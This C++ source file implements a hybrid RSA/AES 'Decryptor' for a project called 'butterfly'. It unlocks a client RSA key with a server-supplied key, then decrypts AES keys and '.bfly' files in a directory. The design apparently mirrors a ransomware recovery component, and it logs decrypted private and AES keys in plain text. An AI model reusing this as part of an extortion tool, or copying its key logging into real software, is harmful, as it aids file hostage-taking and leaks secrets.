
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
{
    LOG_TRACE("Create class Decryptor");
}

Decryptor::~Decryptor()
{

}

void Decryptor::removeBFLYEnding(std::string &filepath)
{
    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
    {
        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
    }
}

void Decryptor::removeDecryptedFiles()
{
    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESIV_FILENAME);
    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
}

void Decryptor::invokeDir(const std::string &path)
{

    std::string aesk = decryptAESKeyPair("AESKey.bin");
    std::string aesiv = decryptAESKeyPair("AESIV.bin");

    if (aesk.empty() or aesiv.empty())
    {
        std::cout << "ERROR" << std::endl;
        LOG_ERROR("Decrypted AESKey or AESIV is empty!")
        return;
    }

    auto files = DirectoryIterator::getAllFiles(path);
    for (auto &file: files)
    {
        LOG_TRACE("FILE: " << file);
        std::string filepath = file.string();
        removeBFLYEnding(filepath);
        std::cout << "File: " << file << std::endl;
        //decryptFileWithAES(filepath, aesk, aesiv);
    }

    //removeDecryptedFiles();
}

std::string Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));

    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(encCPrivateRSAFile);
    EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

    try
    {
        _rsaDecryptorCPrivateRSA->decrypt(CPrivateRSAPKey, encCPrivateRSA);
        _decryptedCPrivateRSA = _rsaDecryptorCPrivateRSA->getDecryptedMessage();

        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);

    } catch (RSADecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

    return _decryptedCPrivateRSA;
}

std::string Decryptor::decryptAESKeyPair(const std::string &aesKeyFile)
{
    _rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));

    std::string encAESKey = _rsaDecryptorAESKey->getBinKeyFileContents(aesKeyFile);
    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESKey->getEvpPkey();

    std::string decryptedAESKey;
    try
    {
        _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey);
        decryptedAESKey = _rsaDecryptorAESKey->getDecryptedMessage();
        LOG_TRACE("Decrypted Content from file " << aesKeyFile << ": " << decryptedAESKey);

    } catch (RSADecryptionException &e)
    {
        std::cout << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

    return decryptedAESKey;
}

void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &aeskey, const std::string &aesiv)
{
    // Set AESKey and AESIV
    _aesDecryptor->setAESKey(aeskey);
    _aesDecryptor->setAESIv(aesiv);

    try
    {
        // Decrypt the file with AES
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
